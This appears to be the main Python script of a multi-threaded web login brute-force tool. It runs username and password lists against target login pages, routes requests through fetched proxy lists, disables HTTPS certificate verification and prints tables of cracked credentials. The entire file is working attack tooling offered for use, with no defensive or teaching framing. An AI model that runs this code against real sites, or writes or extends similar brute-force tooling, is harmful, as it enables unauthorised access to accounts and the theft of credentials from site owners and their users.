#!/usr/bin/python


def attack(options, loginInfo):
	def run_threads(threads, sending, completed, total):
		# Run threads
		for thread in threads:
			thread.start()

		# Wait for threads completed
		for thread in threads:
			completed += 1
			progress_bar(sending, completed, total)
			thread.join()

		return sending, completed
	### SETTING UP FOR NEW ATTACK ###
	if options.attack_mode == "--httpget":
		from modules import httpget
		attack_module = httpget.submit

	elif options.attack_mode == "--loginbrute":
		from modules import loginbrute
		attack_module = loginbrute.submit
	else:
		utils.die("[x] Runtime error: Invalid attack mode", "%s" %(options.attack_mode))

	if not loginInfo:
		# Test for 2 steps... login?
		utils.die("[x] Target check: URL error", "[x] No login request found")
	else:
		if options.verbose:
			utils.printf("[*] Login request has been found!", "good")

	tasks = len(options.passwd) * len(options.username)
	utils.printf("[+] [Tasks: %s] [ID: %s] [Controls: %s]" %(tasks, loginInfo[0], loginInfo[1][::-1]), "good")

	import threading

	if sys.version_info[0] == 2:
		import Queue
		result = Queue.Queue()
	else:
		import queue
		result = queue.Queue()
	
	sending, completed = 0, 0
	try:
		#### START ATTACK ####
		workers = []

		for username in options.username:
			if "--upwd" in options.extras \
				and username not in options.passwd \
				and options.options["-p"] is not "sqli":
					options.passwd += (username,)
			for password in options.passwd:
				if len(workers) == options.threads:
					sending, completed = run_threads(workers, sending, completed, tasks)
					del workers[:]

				if username in [x[1] for x in list(result.queue)]:
					break
				worker = threading.Thread(
					target = attack_module,
					args = (options, loginInfo, [password, username], result)
				)
				worker.daemon = True
				workers.append(worker)

		sending, completed = run_threads(workers, sending, completed, tasks)
		del workers[:]
			
	except KeyboardInterrupt:
		utils.printf("[x] Terminated by user!", "bad")
		global set_break
		set_break = True

	except SystemExit:
		utils.printf("[x] Terminated by system!", "bad")

	except Exception as error:
		utils.die("[x] Runtime error", error)

	finally:
		credentials = list(result.queue)
		if len(credentials) == 0:
			utils.printf("[-] No match found!", "bad")

		else:
			utils.printf("\n[*] %s valid password[s] found:" %(len(credentials)), "norm")
			if not credentials[0][1]:
				utils.print_table(("URL", "Password"), *[creds[::2] for creds in credentials])
			else:
				utils.print_table(("Username", "Password"), *[creds[-2:] for creds in credentials])
			utils.printf("")
		return credentials


if __name__ == "__main__":
	#if check_import():
		# IMPORT GLOBALY
	import sys, time, ssl
	from cores import options
	from cores.check import check_options, check_tasks, check_url, check_login
	import utils
	from utils.progressbar import progress_bar
	from utils.banners import start_banner
	from extras import getproxy # TODO move this line

	try:
		# Setting new session
		runtime = time.time()
		# reload(sys)
		# sys.setdefaultencoding('utf8')

		# Get options
		options = options.ParseOptions()

		if options.help == True:
			from utils import helps
			helps.print_help()
		else:
			check_options(options)

			if "--getproxy" in options.extras:
				getproxy.getnew(options)
				if not options.target:
					utils.printf("[*] No URL provided! Get proxy only.", "good")
					sys.exit(0)
				else:
					if not options.run_options["--proxy"]:
						utils.printf("[-] WARNING!!! Program runs without proxy! Use \"--proxy\"!", "bad")
			if not options.target:
				utils.die("[x] URL error", "An URL is required")

			else:
				# Fix SSL errors https://stackoverflow.com/a/35960702
				try:
					_create_unverified_https_context = ssl._create_unverified_context
				except AttributeError:
				# Legacy Python that doesn't verify HTTPS certificates by default
					pass
				else:
				# Handle target environment that doesn't support HTTPS verification
					ssl._create_default_https_context = _create_unverified_https_context

				utils.printf(start_banner(options))
				results = []
				set_break = False
				for idu, url in enumerate(options.target):
					if set_break:
						break
					if url:
						# Clean other URL options (Fix URL_panel and URL login bug)
						options.login_url = None
						options.panel_url = None
						options.url = check_url(url)
						if "--getproxy" in options.extras and len(options.target) == 1 and options.run_options["--proxy"]:
							utils.printf("[+] Check connection via proxy to %s! Be patient!" %(options.url))
							getproxy.check(options)
						if options.run_options["--proxy"]:
							if len(options.target) > 1:
								utils.printf("[+] Auto check proxy for multiple URLs! Target: %s!" %(options.url))
								getproxy.check(options)
							try:
								options.proxy = getproxy.livelist()
							except:
								utils.printf("[-] Loading file error! Get new list. Please wait!", "bad")
								getproxy.check(options)
								options.proxy = getproxy.livelist()

						utils.printf("[%s / %s] [%s]" %(idu + 1, len(options.target), options.url))
						loginInfo = check_login(options)
						if loginInfo:
							check_tasks(options, loginInfo)
							result = attack(options, loginInfo)
							if result:
								for _result in result:
									results.append(_result)
							#results.append(result)
						else:
							utils.printf("[x] Error no login request found", "bad")

				if "--reauth" in options.extras:
					from extras import reauth
					reauth.run(options, result)

	except Exception as error:
		utils.die("[x] Program stopped", error)

	finally:
		runtime = time.time() - runtime
		try:
			if len(options.target) > 0:
				if len(results) > 0 and len(options.target) > 1:
					utils.printf("[*] Cracked %s target[s]" %(len(results)), "norm")
					utils.print_table(("URL", "Username", "Password"), *results)
			else:
				utils.printf("[x] No target has been cracked", "bad")
		except:
			pass
		utils.printf("\n[*] [Elapsed: %0.2f] [%s]" %(
			runtime,
			time.strftime("%Y-%m-%d %H:%M"),
			),
		"good")
